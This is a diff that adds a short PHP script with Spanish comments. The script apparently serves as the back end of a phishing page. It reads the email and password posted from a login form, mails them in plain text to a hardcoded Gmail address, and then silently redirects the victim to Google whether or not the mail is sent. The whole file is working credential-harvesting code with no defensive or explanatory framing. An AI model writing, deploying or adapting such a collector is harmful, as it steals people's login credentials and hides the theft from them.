@@ -1,0 +1,24 @@
+<?php
+// Configura el correo electrónico del destinatario
+$to = 'castillojavieranderson@gmail.com';
+
+// Obtén los datos del formulario
+$email = $_POST['email'];
+$password = $_POST['password'];
+
+// Asunto y cuerpo del correo electrónico
+$subject = 'Nuevo intento de inicio de sesión';
+$message = "Correo electrónico: $email\nContraseña: $password";
+$headers = "From: no-reply@example.com\r\n";
+
+// Envía el correo electrónico
+if (mail($to, $subject, $message, $headers)) {
+    // Redirige a Google después de enviar el correo
+    header('Location: https://www.google.com');
+    exit(); // Detiene la ejecución del script
+} else {
+    // Redirige a Google en caso de error sin mostrar mensaje
+    header('Location: https://www.google.com');
+    exit(); // Detiene la ejecución del script
+}
+?>
